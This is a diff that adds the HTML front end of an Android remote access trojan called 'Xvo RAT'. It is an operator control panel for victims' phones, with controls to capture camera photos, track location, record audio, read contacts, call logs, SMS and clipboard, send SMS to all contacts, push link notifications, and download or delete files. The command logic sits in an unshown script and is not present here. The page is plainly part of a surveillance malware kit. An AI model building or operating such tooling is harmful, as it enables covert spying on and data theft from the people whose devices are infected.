@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Android RAT Xvo</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <div id="app-container">
+        <!-- Login Container -->
+        <div id="login-container" class="card">
+            <div class="login-header">
+                <i class="fas fa-mobile-alt"></i>
+                <h2>Android Rat Xvoid</h2>
+                <p>Hacking Android Rat</p>
+            </div>
+            <div class="form-group">
+                <label for="username"><i class="fas fa-user"></i> Username:</label>
+                <input type="text" id="username" placeholder="Enter username" required>
+            </div>
+            <div class="form-group">
+                <label for="password"><i class="fas fa-lock"></i> Password:</label>
+                <input type="password" id="password" placeholder="Enter password" required>
+            </div>
+            <button id="login-btn" class="btn primary-btn">
+                <i class="fas fa-sign-in-alt"></i> Login
+            </button>
+            <p id="login-message" class="message"></p>
+        </div>
+
+        <!-- Dashboard Container -->
+        <div id="dashboard-container" style="display: none;">
+            <!-- Header -->
+            <div class="dashboard-header">
+                <div class="header-left">
+                    <h1><i class="fas fa-virus"></i> XVO RAT</h1>
+                    <p>Welcome, <span id="welcome-user"></span>!</p>
+                </div>
+                <div class="header-right">
+                    <div class="connection-status" id="connection-status">
+                        <i class="fas fa-circle"></i> Connected
+                    </div>
+                    <button id="logout-btn" class="btn secondary-btn">
+                        <i class="fas fa-sign-out-alt"></i> Logout
+                    </button>
+                </div>
+            </div>
+
+            <div class="dashboard-content">
+                <!-- Left Panel - Controls -->
+                <div class="left-panel">
+                    <!-- Device Management -->
+                    <div class="card">
+                        <div class="card-header">
+                            <h3><i class="fas fa-mobile-alt"></i> Connected Devices</h3>
+                            <button id="refresh-devices-btn" class="btn info-btn">
+                                <i class="fas fa-sync-alt"></i> Refresh
+                            </button>
+                        </div>
+                        <div id="device-list" class="device-list">
+                            <div class="loading-spinner">
+                                <i class="fas fa-spinner fa-spin"></i> Loading devices...
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="selected-device-uuid">
+                                <i class="fas fa-mobile-alt"></i> Select Device:
+                            </label>
+                            <select id="selected-device-uuid" class="select-device">
+                                <option value="">-- Select a device --</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <!-- Control Panel -->
+                    <div class="card">
+                        <div class="card-header">
+                            <h3><i class="fas fa-gamepad"></i> Control Panel</h3>
+                        </div>
+                        
+                        <!-- Quick Actions -->
+                        <div class="control-section">
+                            <h4><i class="fas fa-bolt"></i> Quick Actions</h4>
+                            <div class="control-grid">
+                                <button class="btn command-btn" data-command="camera_main">
+                                    <i class="fas fa-camera"></i> Rear Camera
+                                </button>
+                                <button class="btn command-btn" data-command="camera_selfie">
+                                    <i class="fas fa-camera-retro"></i> Selfie Camera
+                                </button>
+                                <button class="btn command-btn" data-command="location">
+                                    <i class="fas fa-map-marker-alt"></i> Get Location
+                                </button>
+                                <button class="btn command-btn" data-command="clipboard">
+                                    <i class="fas fa-clipboard"></i> Get Clipboard
+                                </button>
+                                <button class="btn command-btn" data-command="apps">
+                                    <i class="fas fa-th"></i> List Apps
+                                </button>
+                                <button class="btn command-btn" data-command="device_info">
+                                    <i class="fas fa-info-circle"></i> Device Info
+                                </button>
+                                <button class="btn command-btn" data-command="calls">
+                                    <i class="fas fa-phone"></i> Call Logs
+                                </button>
+                                <button class="btn command-btn" data-command="contacts">
+                                    <i class="fas fa-address-book"></i> Contacts
+                                </button>
+                                <button class="btn command-btn" data-command="messages">
+                                    <i class="fas fa-sms"></i> Messages
+                                </button>
+                                <button class="btn command-btn" data-command="vibrate">
+                                    <i class="fas fa-mobile-alt"></i> Vibrate
+                                </button>
+                                <button class="btn command-btn" data-command="stop_audio">
+                                    <i class="fas fa-volume-mute"></i> Stop Audio
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Advanced Controls -->
+                        <div class="control-section">
+                            <h4><i class="fas fa-microphone"></i> Audio Recording</h4>
+                            <div class="form-group inline">
+                                <input type="number" id="mic-duration-input" placeholder="Duration (seconds)" min="1" value="10">
+                                <button class="btn command-btn" data-command="microphone" data-param-input="mic-duration-input">
+                                    <i class="fas fa-microphone"></i> Record
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="control-section">
+                            <h4><i class="fas fa-comment"></i> Toast Message</h4>
+                            <div class="form-group inline">
+                                <input type="text" id="toast-message-input" placeholder="Enter toast message">
+                                <button class="btn command-btn" data-command="toast" data-param-input="toast-message-input">
+                                    <i class="fas fa-comment-dots"></i> Show Toast
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="control-section">
+                            <h4><i class="fas fa-volume-up"></i> Play Audio</h4>
+                            <div class="form-group inline">
+                                <input type="url" id="play-audio-link-input" placeholder="Audio URL (e.g., .mp3)">
+                                <button class="btn command-btn" data-command="play_audio" data-param-input="play-audio-link-input">
+                                    <i class="fas fa-play"></i> Play Audio
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="control-section">
+                            <h4><i class="fas fa-sms"></i> Send SMS</h4>
+                            <div class="form-group inline">
+                                <input type="text" id="sms-number-input" placeholder="Phone number">
+                                <input type="text" id="sms-message-input" placeholder="SMS message">
+                                <button class="btn command-btn" data-command="send_message" data-param-inputs="sms-number-input,sms-message-input">
+                                    <i class="fas fa-paper-plane"></i> Send SMS
+                                </button>
+                            </div>
+                            <div class="form-group inline">
+                                <input type="text" id="sms-all-message-input" placeholder="Message to all contacts">
+                                <button class="btn command-btn danger-btn" data-command="send_message_to_all" data-param-input="sms-all-message-input">
+                                    <i class="fas fa-broadcast-tower"></i> Send to All
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="control-section">
+                            <h4><i class="fas fa-bell"></i> Notification</h4>
+                            <div class="form-group inline">
+                                <input type="text" id="notif-title-input" placeholder="Notification Title">
+                                <input type="url" id="notif-link-input" placeholder="Link (URL to open)">
+                                <button class="btn command-btn" data-command="show_notification" data-param-inputs="notif-title-input,notif-link-input">
+                                    <i class="fas fa-bell"></i> Show Notification
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="control-section">
+                            <h4><i class="fas fa-folder"></i> File Management</h4>
+                            <div class="form-group inline">
+                                <input type="text" id="file-path-input" placeholder="File path (e.g., /sdcard/DCIM/photo.jpg)">
+                                <button class="btn command-btn" data-command="file" data-param-input="file-path-input">
+                                    <i class="fas fa-download"></i> Get File
+                                </button>
+                                <button class="btn command-btn danger-btn" data-command="delete_file" data-param-input="file-path-input">
+                                    <i class="fas fa-trash"></i> Delete File
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Right Panel - Results -->
+                <div class="right-panel">
+                    <!-- Status -->
+                    <div class="card">
+                        <div class="card-header">
+                            <h3><i class="fas fa-info-circle"></i> Status</h3>
+                            <button id="clear-results-btn" class="btn secondary-btn">
+                                <i class="fas fa-broom"></i> Clear All
+                            </button>
+                        </div>
+                        <p id="status-message" class="message info-message">
+                            <i class="fas fa-clock"></i> Waiting for commands...
+                        </p>
+                    </div>
+
+                    <!-- Live Messages -->
+                    <div class="card">
+                        <div class="card-header">
+                            <h3><i class="fas fa-comments"></i> Live Messages</h3>
+                            <button id="clear-messages-btn" class="btn secondary-btn">
+                                <i class="fas fa-eraser"></i> Clear
+                            </button>
+                        </div>
+                        <div id="android-messages-log" class="messages-container">
+                            <pre id="android-live-log">No messages yet...</pre>
+                        </div>
+                    </div>
+
+                    <!-- Results Tabs -->
+                    <div class="card">
+                        <div class="card-header">
+                            <h3><i class="fas fa-chart-line"></i> Results</h3>
+                            <div class="tabs">
+                                <button class="tab-btn active" data-tab="photos">
+                                    <i class="fas fa-images"></i> Photos
+                                </button>
+                                <button class="tab-btn" data-tab="location">
+                                    <i class="fas fa-map"></i> Location
+                                </button>
+                                <button class="tab-btn" data-tab="files">
+                                    <i class="fas fa-file"></i> Files
+                                </button>
+                                <button class="tab-btn" data-tab="text">
+                                    <i class="fas fa-file-text"></i> Text
+                                </button>
+                                <button class="tab-btn" data-tab="audio">
+                                    <i class="fas fa-music"></i> Audio
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <div class="results-area">
+                            <div id="photos-tab" class="tab-content active">
+                                <div id="photo-results" class="result-section">
+                                    <div class="empty-state">
+                                        <i class="fas fa-camera"></i>
+                                        <p>No photos captured yet</p>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div id="location-tab" class="tab-content">
+                                <div id="location-results" class="result-section">
+                                    <div class="empty-state">
+                                        <i class="fas fa-map-marker-alt"></i>
+                                        <p>No location data available</p>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div id="files-tab" class="tab-content">
+                                <div id="file-results" class="result-section">
+                                    <div class="empty-state">
+                                        <i class="fas fa-folder-open"></i>
+                                        <p>No files retrieved yet</p>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div id="text-tab" class="tab-content">
+                                <div id="text-results" class="result-section">
+                                    <div class="empty-state">
+                                        <i class="fas fa-file-text"></i>
+                                        <p>No text data available</p>
+                                    </div>
+                                </div>
+                                <div id="clipboard-results" class="result-section"></div>
+                            </div>
+                            
+                            <div id="audio-tab" class="tab-content">
+                                <div id="microphone-results" class="result-section">
+                                    <div class="empty-state">
+                                        <i class="fas fa-microphone"></i>
+                                        <p>No audio recordings yet</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/script.js"></script>
+</body>
+</html>
